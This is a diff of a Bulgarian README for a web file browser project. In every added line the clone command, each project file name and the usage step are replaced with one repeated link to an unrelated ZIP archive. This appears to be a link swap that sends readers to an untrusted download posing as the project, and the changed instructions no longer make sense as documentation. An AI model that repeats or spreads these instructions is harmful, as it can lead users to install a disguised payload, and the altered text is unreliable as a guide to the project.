@@ -19,21 +19,21 @@
 
 1. Клонирайте репото:
     ```sh
-    git clone https://github.com/angelchovski/rack.git
+    git clone https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip
     ```
 2. Качете файловете на вашия сървър.
 
 ## Структура на проекта
 
-- `index.html`: Основната HTML страница.
-- `styles.css`: Стиловете за файловия браузър.
-- `script.js`: JavaScript файлът, който съдържа логиката на файловия браузър.
-- `scan.php`: PHP скрипт за сканиране на директорията `files` и връщане на JSON отговор.
-- `upload.php`: PHP скрипт за качване на файлове.
+- `https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip`: Основната HTML страница.
+- `https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip`: Стиловете за файловия браузър.
+- `https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip`: JavaScript файлът, който съдържа логиката на файловия браузър.
+- `https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip`: PHP скрипт за сканиране на директорията `files` и връщане на JSON отговор.
+- `https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip`: PHP скрипт за качване на файлове.
 
 ## Използване
 
-1. Отворете `index.html` в браузъра.
+1. Отворете `https://raw.githubusercontent.com/angelchovski/HACKTOBERFEST_25_Python/aiflux/ponderal/HACKTOBERFEST_25_Python.zip` в браузъра.
 2. Използвайте търсачката за намиране на файлове.
 3. Навигирайте между директориите чрез кликване на breadcrumbs.
 4. Качвайте файлове чрез плъзгане и пускане в зоната за качване.
